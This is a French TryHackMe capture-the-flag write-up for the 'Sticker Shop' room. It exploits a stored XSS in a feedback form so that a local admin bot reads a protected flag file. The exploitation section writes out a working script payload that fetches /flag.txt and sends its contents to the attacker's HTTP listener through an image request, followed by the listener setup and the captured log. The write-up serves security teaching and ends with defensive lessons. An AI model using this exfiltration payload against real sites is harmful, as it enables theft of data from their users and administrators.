# THE STICKER SHOP — TryHackMe Writeup

**Difficulté :** Easy

---

## Objectif

> Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!
>
> Can you read the flag at `http://10.80.144.206:8080/flag.txt`?

---

## Reconnaissance

- **Serveur :** `Werkzeug/3.0.1 Python/3.8.10`
- **Routes identifiées :**
  - `/` — boutique de stickers (cat shop)
  - `/feedback` — formulaire de retour client
  - `/flag.txt` — protégé, renvoie `401` depuis l'extérieur

Le flag n'est accessible qu'en local (localhost), ce qui suggère que le serveur vérifie l'origine de la requête. La description de la room précise que le shop **héberge et navigue sur le web depuis la même machine** : un bot/admin consulte les feedbacks depuis le serveur lui-même.

---

## Analyse de la vulnérabilité

Le formulaire `POST /submit_feedback` accepte n'importe quelle entrée et la réaffiche sans assainissement → **XSS stocké**.

Comme le bot consulte les feedbacks depuis `localhost`, son navigateur peut lire `http://127.0.0.1:8080/flag.txt` alors que nous, depuis l'extérieur, recevons un `401`.

---

## Exploitation

### 1. Récupérer notre IP VPN

```bash
ip addr show tun0
```

```text
4: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1380 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none
    inet 192.168.130.110/18 brd 192.168.191.255 scope global tun0
       valid_lft forever preferred_lft forever
```

Notre IP attaquante : `192.168.130.110`.

### 2. Lancer un listener HTTP

```bash
python3 -m http.server 8000 --bind 0.0.0.0
```

```text
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

### 3. Envoyer le payload XSS

```bash
curl -i -s -X POST 'http://10.80.144.206:8080/submit_feedback' \
  --data-urlencode "feedback=<script>fetch('/flag.txt').then(r=>r.text()).then(t=>{new Image().src='http://192.168.130.110:8000/?f='+encodeURIComponent(t)})</script>"
```

**Explication du payload :**

| Étape | Détail |
|-------|--------|
| `fetch('/flag.txt')` | Requête same-origin exécutée depuis le navigateur du bot (localhost) |
| `.then(r=>r.text())` | Récupère le contenu du fichier en texte |
| `new Image().src=...` | Exfiltration via une requête GET vers notre listener |
| `encodeURIComponent(t)` | Encode le flag pour éviter les caractères problématiques dans l'URL |

### 4. Récupérer le flag

Dès que le bot consulte le feedback :

```text
10.80.144.206 - - [04/Nov/2026 12:28:16] "GET /?f=THM%REDACTED%7D HTTP/1.1" 200 -
```

Décoder la valeur URL-encodée :

```bash
python3 -c 'import urllib.parse,sys; print(urllib.parse.unquote(sys.argv[1]))' 'THM%7BREDACTED%7D'
```

**Flag :** `THM{REDACTED}`

---

## Leçons retenues

- **XSS stocké** dans un formulaire de feedback → exécution dans le contexte du bot admin.
- **Bot local** → accès à des ressources normalement protégées (ex. `/flag.txt` avec `401` externe).
- **Exfiltration via `Image()`** → fiable, silencieuse et ne nécessite pas de CORS.
- **Assainissement des entrées obligatoire** côté serveur + **CSP** pour bloquer les scripts inline.
- Ne **jamais** héberger un service web sur la même machine que celle utilisée pour la navigation admin.

---

## Références

- [OWASP — Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger — Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)
- Room : [TryHackMe — The Sticker Shop](https://tryhackme.com/)

